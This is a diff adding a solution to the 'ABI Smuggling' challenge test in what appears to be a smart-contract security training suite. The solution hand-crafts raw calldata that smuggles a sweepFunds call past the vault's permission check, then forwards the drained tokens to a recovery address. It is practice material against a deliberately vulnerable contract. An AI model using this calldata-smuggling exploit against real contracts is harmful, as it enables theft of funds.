@@ -6,6 +6,13 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";
 
+contract TokenForwarder {
+    function forward(address token, address to) external {
+        IERC20 erc20 = IERC20(token);
+        erc20.transfer(to, erc20.balanceOf(address(this)));
+    }
+}
+
 contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -73,7 +80,28 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        address receiver = address(0x111111111111111111111111111111d9CaeD1211);
+        vm.etch(receiver, type(TokenForwarder).runtimeCode);
+
+        bytes memory raw = new bytes(8517);
+
+        _writeWord(raw, 0, bytes32(uint256(uint32(AuthorizedExecutor.execute.selector)) << 224));
+        _writeWord(raw, 4, bytes32(uint256(uint160(address(vault)))));
+        _writeWord(raw, 36, bytes32(uint256(33)));
+        _writeWord(raw, 69, bytes32(uint256(uint32(SelfAuthorizedVault.sweepFunds.selector)) << 224));
+        _writeWord(raw, 73, bytes32(uint256(uint160(receiver))));
+        _writeWord(raw, 105, bytes32(uint256(uint160(address(token)))));
+
+        (bool ok, bytes memory result) = address(vault).call(raw);
+        require(ok, string(result));
+
+        TokenForwarder(receiver).forward(address(token), recovery);
+    }
+
+    function _writeWord(bytes memory buffer, uint256 offset, bytes32 word) private pure {
+        assembly {
+            mstore(add(add(buffer, 0x20), offset), word)
+        }
     }
 
     /**
